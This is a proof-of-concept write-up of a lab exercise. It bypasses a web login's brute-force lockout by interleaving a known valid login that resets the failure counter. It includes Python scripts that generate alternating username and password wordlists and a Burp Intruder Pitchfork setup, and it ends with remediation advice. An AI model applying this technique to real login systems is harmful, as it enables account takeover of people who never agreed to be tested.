## Proof of Concept: Bypassing Broken Brute-Force Protection

### Vulnerability Overview

**Broken Brute-Force Protection** refers to a vulnerability where a web application's brute-force protection mechanism fails to effectively prevent automated login attempts. Brute-force attacks involve repeated login attempts to guess credentials, and protection mechanisms typically:

- Lock the account after multiple failed login attempts.
- Block the attacker's IP address after rapid successive attempts.

However, flawed logic in the implementation can allow attackers to bypass these protections, enabling successful brute-forcing of credentials.

### Proof of Concept (PoC)

This PoC demonstrates how an attacker can bypass the brute-force protection mechanism of a web application to successfully brute-force a user's password. The test was conducted in a lab environment with a known vulnerability. The application blocks login attempts after three incorrect tries, requiring a one-minute wait. However, a successful login (e.g., with a known valid credential) resets the brute-force counter to zero, allowing an attacker to strategically intersperse valid logins and continue the attack.

#### Step 1: Identify the Brute-Force Protection Mechanism
- Logged into the lab-provided account with the username `wiener` and a valid password, then logged out.
- Attempted login with the correct username (`wiener`) but with incorrect passwords to test the protection mechanism.
- **Result**: After three incorrect attempts, the application blocked further login attempts for one minute.

- Discovered a bypass: If two incorrect attempts are made, followed by a successful login on the third attempt (e.g., using `wiener` with its correct password `peter`), the counter resets to zero, allowing the attack to continue.

#### Step 2: Set Up the Brute-Force Attack Using Burp Suite
- **Objective**: Brute-force the password for the username `carlos` using a provided password list, while bypassing the brute-force protection.
- Intercepted a login request and sent it to Burp Suite Intruder.
- Configured Intruder with the **Pitchfork** attack type, setting two payload positions: username and password.
- Set the resource pool to 1 concurrent request to avoid triggering rate limits unrelated to the counter.

#### Step 3: Generate the Username Payload
- Created a username payload to alternate between `carlos` (target user) and `wiener` (known valid user) to reset the counter:
  - Used the following Python script to generate a repeating pattern of `["carlos", "carlos", "wiener"]` for 100 entries:  
    ```python
    # Define the repeating pattern
    pattern = ["carlos", "carlos", "wiener"]
   
    # Calculate how many full repetitions we can have in 100 words
    full_repeats = 100 // len(pattern)  # This gives 33 full repeats (99 words)
    remainder = 100 % len(pattern)      # 1 word left

    # Create the wordlist
    wordlist = pattern * full_repeats + pattern[:remainder]

    # Optional: print or save to file
    print(" ".join(wordlist))

    # To save to a file:
    with open("wordlist.txt", "w") as f:
        f.write(" ".join(wordlist))
    ```
- **Resulting Username Payload**:  
  ```
  carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos carlos wiener carlos
  ```
- This ensures that after two attempts with `carlos`, the third attempt uses `wiener` with its correct password to reset the counter.

#### Step 4: Generate the Password Payload
- Modified the lab-provided password list to insert the correct password for `wiener` (`peter`) at every third entry, ensuring the counter reset works:
  - Used the following Python script to modify the password list:  
    ```python
    #!/usr/bin/python3
    with open('original_wordlist.txt', 'r') as f:
        words = f.read().splitlines()

    output = []
    for i in range(0, len(words), 2):
        output.append(words[i])
        if i + 1 < len(words):
            output.append(words[i + 1])
        output.append('peter')

    with open('modified_wordlist.txt', 'w') as f:
        for word in output:
            f.write(word + '\n')
    ```
- **Resulting Password Payload**:  
  ```
  123456
  password
  peter
  12345678
  qwerty
  peter
  123456789
  12345
  peter
  ...
  (continues with "peter" at every third entry)
  ```

#### Step 5: Execute the Brute-Force Attack
- Configured Burp Intruder with the generated username and password payloads.
- Started the attack, where Burp Intruder attempted logins in the pattern:  
  - Attempts 1-2: `carlos` with two different passwords from the list.  
  - Attempt 3: `wiener` with the correct password `peter` (resets the counter).  
  - Repeats the cycle.

#### Step 6: Verify the Success of the Attack
- **Result**: The brute-force attack succeeded:  
  - Payloads using `wiener` with `peter` returned a `302` status (successful login, resetting the counter).  
  - One payload with `carlos` and the correct password (discovered during the attack) also returned a `302` status, indicating successful authentication.

### Summary of Findings

- The web applicationâ€™s brute-force protection blocks login attempts after three incorrect tries but resets the counter upon a successful login.
- By interspersing a known valid login (`wiener:peter`) every third attempt, the counter is reset, allowing continuous brute-forcing of the target user `carlos`.
- Using Burp Suite Intruder with a custom payload pattern, the password for `carlos` was successfully brute-forced, bypassing the protection mechanism.

---

### Conclusion

This PoC confirms that the "Broken Brute-Force Protection" vulnerability allows an attacker to bypass the login attempt limit by resetting the counter with a valid login. This enables a continuous brute-force attack to guess the password of a target user (`carlos`). Immediate remediation is recommended, such as implementing a more robust protection mechanism that does not reset the counter on successful logins or uses additional safeguards like CAPTCHA or stricter rate limiting.
